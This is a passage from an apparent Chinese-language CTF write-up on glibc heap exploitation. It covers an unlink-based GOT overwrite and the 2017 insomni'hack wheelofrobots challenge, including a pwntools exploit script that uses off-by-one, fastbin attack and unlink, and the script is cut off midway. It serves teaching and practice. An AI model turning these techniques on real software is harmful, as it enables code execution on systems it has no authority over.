|</span><br><span class="line">                 ptr[1]----------&gt; +-----------------+ chunk 1</span><br><span class="line">                                   |    size&#x3D;0x20    |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    prevsize     |</span><br><span class="line">                                   +-----------------|-------------</span><br><span class="line">                                   |   ...           |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |  ...            |</span><br><span class="line">fake ptr[0] chunk&#39;s nextchunk-----&gt;+-----------------+</span><br><span class="line">                                   |    ...          |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    fakebk       |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    fakefd       |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    0xa1         |  chunk 0</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    &#39;0&#39; *8       |</span><br><span class="line">                 ptr[0]----------&gt; +-----------------+</span><br><span class="line">                                   |    size&#x3D;0x91    |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    prev_size    |</span><br><span class="line">                                   +-----------------+  low addr</span><br><span class="line">                                           图2</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x /40gx 0x603000</span></span><br><span class="line">0x603000:0x00000000000000000x0000000000000091</span><br><span class="line">0x603010:0x00000000000000000x00000000000000a1</span><br><span class="line">0x603020:0x00000000006021080x0000000000602110</span><br><span class="line">0x603030:0x00000000000000000x0000000000000000</span><br><span class="line">0x603040:0x00000000000000000x0000000000000000</span><br><span class="line">0x603050:0x00000000000000000x0000000000000000</span><br><span class="line">0x603060:0x00000000000000000x0000000000000000</span><br><span class="line">0x603070:0x00000000000000000x0000000000000000</span><br><span class="line">0x603080:0x00000000000000000x0000000000000000</span><br><span class="line">0x603090:0x00000000000000000x0000000000000021</span><br><span class="line">0x6030a0:0x61616161616161610x6161616161616161</span><br><span class="line">0x6030b0:0x00000000000000a00x0000000000000090</span><br><span class="line">0x6030c0:0x63636363636363000x0000000000000000</span><br></pre></td></tr></table></figure><p>该覆盖主要是为了释放 chunk2 的时候可以后向合并（合并低地址），对 chunk0 中虚拟构造的 chunk 进行 unlink。即将要执行的操作为 unlink(ptr[0])，同时我们所构造的 fakebk 和 fakefd 满足如下约束</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br></pre></td></tr></table></figure><p>unlink 成功执行，会导致 ptr[0] 所存储的地址变为 fakebk，即 ptr-0x18。</p><h4 id="泄露-libc-地址"><a href="#泄露-libc-地址" class="headerlink" title="泄露 libc 地址"></a>泄露 libc 地址</h4><p>代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(atoi_got)</span><br><span class="line">editnote(<span class="number">0</span>,<span class="number">1</span>,payload)</span><br><span class="line">shownote(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Content is &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = leak_addr - libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">onegadget = libc_base + <span class="number">0xf1207</span></span><br><span class="line">log.info(<span class="string">&quot;leak_addr:&quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">log.info(<span class="string">&quot;system_addr:&quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line">log.info(<span class="string">&quot;onegadget:&quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br></pre></td></tr></table></figure><p>我们修改 ptr[0] 的内容为 ptr 的地址 - 0x18，所以当我们再次编辑 note0 时，可以覆盖 ptr[0] 的内容。这里我们将其覆盖为 atoi 的地址。 这样的话，如果我们查看 note 0 的内容，其实查看的就是 atoi 的地址。</p><h4 id="修改-atoi-got"><a href="#修改-atoi-got" class="headerlink" title="修改 atoi got"></a>修改 atoi got</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(onegadget)</span><br><span class="line">editnote(<span class="number">0</span>,<span class="number">1</span>,payload)</span><br></pre></td></tr></table></figure><p>由于此时 ptr[0] 的地址 got 表的地址，所以我们可以直接修改该 note，覆盖为 one_gadget 地址。</p><h4 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">&#x27;skye&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>此时如果我们再调用 atoi ，其实调用的就是 one_gadget ，所以就可以拿到 shell 了。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>题目考点：unlink、fastbin 机制、数字类型运算转换。</p><p>unlink 和 fastbin 与上面学习的差别不大，都是利用 unlink 控制 chunk list 修改当中的 堆指针地址，实现一个任意地址读写。</p><p>一开始在这条题目卡住就是在，edit 这个功能一度以为存在堆溢出。最后看 wp 才知道存在 unsigned int 与 int 运算类型转换的逻辑漏洞，找到溢出点就好做了。</p><h2 id="2017-insomni’hack-wheelofrobots"><a href="#2017-insomni’hack-wheelofrobots" class="headerlink" title="2017 insomni’hack wheelofrobots"></a>2017 insomni’hack wheelofrobots</h2><h3 id="基本信息-2"><a href="#基本信息-2" class="headerlink" title="基本信息"></a>基本信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wheelofrobots: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>动态链接 64 位，主要开启了 canary 保护与 nx 保护。</p><h3 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h3><p>大概分析程序，可以得知，这是一个配置机器人轮子的游戏，机器人一共需要添加 3 个轮子才能启动。</p><p>程序非常依赖的一个功能是读取整数，该函数 read_num 是读取最长为 4 字节的内容，然后将其转化为 int 类型返回。</p><p>程序基本功能：堆增删查改。</p><ul><li><p>add</p><p>最多能申请 3 个堆块。每种轮子的创建策略不同，主要确保是申请大小的限制以及是否固定大小。</p></li><li><p>start_robot</p><p>随机选择一个轮子（堆）的内容进行输出，然后退出程序。</p></li><li><p>change</p><p>根据每个 chunk size 修改 chunk 内容</p></li></ul><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><h4 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off-by-one"></a>off-by-one</h4><p>add 选择添加的轮子时，调用 read_num 最长可以写入 4 字节，最后 1 字节会覆盖 bender_inuse ，构成了 off-by-one 漏洞。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.bss:0000000000603110 choice          db    ? ;               ; DATA XREF: add+3A↑o</span><br><span class="line">.bss:0000000000603110                                         ; add+49↑o ...</span><br><span class="line">.bss:0000000000603111                 db    ? ;</span><br><span class="line">.bss:0000000000603112                 db    ? ;</span><br><span class="line">.bss:0000000000603113                 db    ? ;</span><br><span class="line">.bss:0000000000603114 bender_inuse    dd ?                    ; DATA XREF: add:loc_400EE0↑r</span><br></pre></td></tr></table></figure><h4 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h4><p>add 添加 destructor 轮子（第6个）时，size 是正常产生的：<code>destructor = calloc(1uLL, 20 * v5);</code> ，没有对 v5 大小进行限制，具体可以对比第 3 个轮子。read_num 定义返回值为 int ，v5 定义为 unsigned int ，只要读取的数为负数，那么在申请<code>calloc(1uLL, 20 * v5);</code> 时就可能导致 <code>20*v5</code> 溢出。与此同时， <code>destructor_size = v5</code> 会很大，destructor_size 定义为 __int64 即 long long int 有符号 64 位整数，v5 强制赋值给它会依然为一个非常大的正数。</p><h4 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h4><p>free chunk 只是释放内存，没有将对应指针清空，size 位也没有清空。</p><h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><blockquote><p>构造任意读写指针比较绕，后面就是前面的 unlink 操作。</p></blockquote><p>基本利用思路如下</p><ol><li><p>利用 off by one 漏洞与 fastbin attack 分配 chunk 到 0x603138，进而可以控制 <code>destructor_size</code>的大小，从而实现任意长度堆溢出。这里我们将轮子 1 tinny 分配到这里。</p><blockquote><p>这里是一定要 destructor 这个轮子，控制其他轮子的 size 值也是可以的，但主要是否能 bypass fastbin 的检查就行。</p></blockquote><p>fastbin attack 将 1 tinny 指针指向 destructor_size ，后续通过 edit 1 tinny 修改 destructor_size 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># add a fastbin chunk 0x20 and free it</span></span><br><span class="line"><span class="comment"># fastbin 指针指向：2 bender-&gt;NULL</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">1</span>)  <span class="comment"># 2 bender</span></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># off-by-one 覆写 idx2 inuse 为 1 让我们能编辑</span></span><br><span class="line">overflow_benderinuse(<span class="string">&#x27;\x01&#x27;</span>)</span><br><span class="line"><span class="comment"># 覆写 fd 2 0x603138, point to 2 bender&#x27;s size,后面伪造堆fd就是destructor_size</span></span><br><span class="line"><span class="comment"># now fastbin 0x20, idx2-&gt;0x603138-&gt;NULL</span></span><br><span class="line">change(<span class="number">2</span>, p64(<span class="number">0x603138</span>))</span><br><span class="line"><span class="comment"># off-by-one 覆写 idx2 inuse 为 1</span></span><br><span class="line"><span class="comment"># 让我们再一次申请 2 bender</span></span><br><span class="line">overflow_benderinuse(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># add 2 bender again, fastbin 0x603138-&gt;NULL</span></span><br><span class="line"><span class="comment"># 将原来 2 bender 空间申请出来</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line"><span class="comment"># in order to malloc chunk at 0x603138</span></span><br><span class="line"><span class="comment"># 绕过fastbin size 检查：将size位伪造一个fastbin范围的值</span></span><br><span class="line"><span class="comment"># we need to bypass the fastbin size check, i.e. set *0x603140=0x20</span></span><br><span class="line"><span class="comment"># 0x603140 是 3 Devil 的size位，申请fastbin范围即可</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x20</span>)</span><br><span class="line"><span class="comment"># trigger malloc, set tinny point to 0x603148</span></span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 释放无用堆</span></span><br><span class="line"><span class="comment"># wheels must &lt;= 3</span></span><br><span class="line"><span class="comment"># only save tinny(0x603138)</span></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br></pre></td></tr></table></figure></li><li><p>分别分配合适大小的物理相邻的 chunk，其中包括 destructor。借助上面可以任意长度堆溢出的漏洞，对 destructor 对应的 chunk 进行溢出，将其溢出到下一个物理相邻的 chunk，从而实现对 0x6030E8 处 fake chunk 进行 unlink 的效果，这时 bss 段的 destructor 指向 0x6030D0。从而，我们可以再次实现覆盖 bss 段几乎所有的内容。</p><p>unlink 将 6 destructor 的指针指向 0x06030E8 - 0x18</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># alloc 6 destructor size 60-&gt;0x50, chunk content 0x40</span></span><br><span class="line">add(<span class="number">6</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment"># alloc 3 devil, size=20*7=140, bigger than fastbin</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">7</span>)</span><br><span class="line"><span class="comment"># edit destructor&#x27;s size to 1000 by tinny</span></span><br><span class="line">change(<span class="number">1</span>, p64(<span class="number">1000</span>))</span><br><span class="line"><span class="comment"># place fake chunk at destructor&#x27;s pointer</span></span><br><span class="line">fakechunk_addr = <span class="number">0x6030E8</span></span><br><span class="line">fakechunk = p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(fakechunk_addr - <span class="number">0x18</span>) + p64(</span><br><span class="line">    fakechunk_addr - <span class="number">0x10</span>) + p64(<span class="number">0x20</span>)</span><br><span class="line">fakechunk = fakechunk.ljust(<span class="number">0x40</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">fakechunk += p64(<span class="number">0x40</span>) + p64(<span class="number">0xa0</span>)</span><br><span class="line">change(<span class="number">6</span>, fakechunk)</span><br><span class="line"><span class="comment"># trigger unlink</span></span><br><span class="line">remove(<span class="number">3</span>)</span><br></pre></td></tr></table></figure></li><li><p>构造一个任意地址写的漏洞。通过上述的漏洞将已经分配的轮子 1 tinny 指针覆盖为 destructor 的地址，那么此后编辑 tinny 即在编辑 destructor 的内容，进而当我们再次编辑 destructor 时就相当于任意低地址写。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># make 0x6030F8 point to 0x6030E8</span></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">2</span> + <span class="number">0x18</span> * <span class="string">&#x27;a&#x27;</span> + p64(<span class="number">0x6030E8</span>)</span><br><span class="line">change(<span class="number">6</span>, payload)</span><br></pre></td></tr></table></figure></li><li><p>由于程序只是在最后启动机器人的时候，才会随机输出一些轮子的内容，并且一旦输出，程序就会退出，由于这部分我们并不能控制，所以我们将 <code>exit()</code> patch 为一个 <code>ret</code> 地址。这样的话，我们就可以多次输出内容了，从而可以泄漏一些 got 表地址。<strong>其实，既然我们有了任意地址写的漏洞，我们也可以将某个 got 写为 puts 的 plt 地址，进而调用相应函数时便可以直接将相应内容输出。但是这里并不去采用这种方法，因为之前已经在 hitcon stkof 中用过这种手法了。</strong></p><blockquote><p>将 exit() got 表修改为 ret ，就通过多次调用总会输出被我们修改指针的轮子</p><p>hijack 某个函数 got 为 puts ，比如 free 那么实际上不是释放了是输出指针指向的内容</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># make exit just as return</span></span><br><span class="line">write(elf.got[<span class="string">&#x27;exit&#x27;</span>], <span class="number">0x401954</span>)</span><br></pre></td></tr></table></figure></li><li><p>在泄漏了相应的内容后，我们便可以得到 libc 基地址，system 地址，libc 中的 /bin/sh 地址。进而我们修改 free@got 为 system 地址。从而当再次释放某块内存时，便可以启动 shell。</p></li></ol><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./wheelofrobots&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./wheelofrobots&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx, size=<span class="number">0</span></span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">2</span>:</span><br><span class="line">        p.recvuntil(<span class="string">&quot;Increase Bender&#x27;s intelligence: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">3</span>:</span><br><span class="line">        p.recvuntil(<span class="string">&quot;Increase Robot Devil&#x27;s cruelty: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">6</span>:</span><br><span class="line">        p.recvuntil(<span class="string">&quot;Increase Destructor&#x27;s powerful: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">idx, name</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Robot&#x27;s name: \n&quot;</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_robot</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">overflow_benderinuse</span>(<span class="params">inuse</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.send(<span class="string">&#x27;9999&#x27;</span> + inuse)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">where, what</span>):</span></span><br><span class="line">    change(<span class="number">1</span>, p64(where))</span><br><span class="line">    change(<span class="number">6</span>, p64(what))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;step 1 - fastbin attack&quot;</span></span><br><span class="line">    <span class="comment"># add a fastbin chunk 0x20 and free it</span></span><br><span class="line">    <span class="comment"># fastbin 指针指向：2 bender-&gt;NULL</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">1</span>)  <span class="comment"># 2 bender</span></span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line">    <span class="comment"># off-by-one 覆写 idx2 inuse 为 1 让我们能编辑</span></span><br><span class="line">    overflow_benderinuse(<span class="string">&#x27;\x01&#x27;</span>)</span><br><span class="line">    <span class="comment"># 覆写 fd 2 0x603138, point to 2 bender&#x27;s size,后面伪造堆fd就是destructor_size</span></span><br><span class="line">    <span class="comment"># now fastbin 0x20, idx2-&gt;0x603138-&gt;NULL</span></span><br><span class="line">    change(<span class="number">2</span>, p64(<span class="number">0x603138</span>))</span><br><span class="line">    <span class="comment"># off-by-one 覆写 idx2 inuse 为 1</span></span><br><span class="line">    <span class="comment"># 让我们再一次申请 2 bender</span></span><br><span class="line">    overflow_benderinuse(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    <span class="comment"># add 2 bender again, fastbin 0x603138-&gt;NULL</span></span><br><span class="line">    <span class="comment"># 将原来 2 bender 空间申请出来</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="comment"># in order to malloc chunk at 0x603138</span></span><br><span class="line">    <span class="comment"># 绕过fastbin size 检查：将size位伪造一个fastbin范围的值</span></span><br><span class="line">    <span class="comment"># we need to bypass the fastbin size check, i.e. set *0x603140=0x20</span></span><br><span class="line">    <span class="comment"># 0x603140 是 3 Devil 的size位，申请fastbin范围即可</span></span><br><span class="line">    add(<span class="number">3</span>, <span class="number">0x20</span>)</span><br><span class="line">    <span class="comment"># trigger malloc, set tinny point to 0x603148</span></span><br><span class="line">    add(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 释放无用堆</span></span><br><span class="line">    <span class="comment"># wheels must &lt;= 3</span></span><br><span class="line">    <span class="comment"># only save tinny(0x603138)</span></span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line">    remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;step 2 - unlink&#x27;</span></span><br><span class="line">    <span class="comment"># alloc 6 destructor size 60-&gt;0x50, chunk content 0x40</span></span><br><span class="line">    add(<span class="number">6</span>, <span class="number">3</span>)</span><br><span class="line">    <span class="comment"># alloc 3 devil, size=20*7=140, bigger than fastbin</span></span><br><span class="line">    add(<span class="number">3</span>, <span class="number">7</span>)</span><br><span class="line">    <span class="comment"># edit destructor&#x27;s size to 1000 by tinny</span></span><br><span class="line">    change(<span class="number">1</span>, p64(<span class="number">1000</span>))</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    <span class="comment"># place fake chunk at destructor&#x27;s pointer</span></span><br><span class="line">    fakechunk_addr = <span class="number">0x6030E8</span></span><br><span class="line">    fakechunk = p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(fakechunk_addr - <span class="number">0x18</span>) + p64(</span><br><span class="line">        fakechunk_addr - <span class="number">0x10</span>) + p64(<span class="number">0x20</span>)</span><br><span class="line">    fakechunk = fakechunk.ljust(<span class="number">0x40</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    fakechunk += p64(<span class="number">0x40</span>) + p64(<span class="number">0xa0</span>)</span><br><span class="line">    change(<span class="number">6</span>, fakechunk)</span><br><span class="line">    <span class="comment"># trigger unlink</span></span><br><span class="line">    remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;step 3 - hijack chunk1 ptr&#x27;</span></span><br><span class="line">    <span class="comment"># make 0x6030F8 point to 0x6030E8</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) * <span class="number">2</span> + <span class="number">0x18</span> * <span class="string">&#x27;a&#x27;</span> + p64(<span class="number">0x6030E8</span>)</span><br><span class="line">    change(<span class="number">6</span>, payload)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;step 4 - hijack exit.got&#x27;</span></span><br><span class="line">    <span class="comment"># make exit just as return</span></span><br><span class="line">    write(elf.got[<span class="string">&#x27;exit&#x27;</span>], <span class="number">0x401954</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;step 5&#x27;</span></span><br><span class="line">    <span class="comment"># set wheel cnt =3, 0x603130 in order to start robot</span></span><br><span class="line">    write(<span class="number">0x603130</span>, <span class="number">3</span>)</span><br><span class="line">    <span class="comment"># set destructor point to puts@got</span></span><br><span class="line">    change(<span class="number">1</span>, p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">    start_robot()</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;New hands great!! Thx &#x27;</span>)</span><br><span class="line">    puts_addr = p.recvuntil(<span class="string">&#x27;!\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    puts_addr = 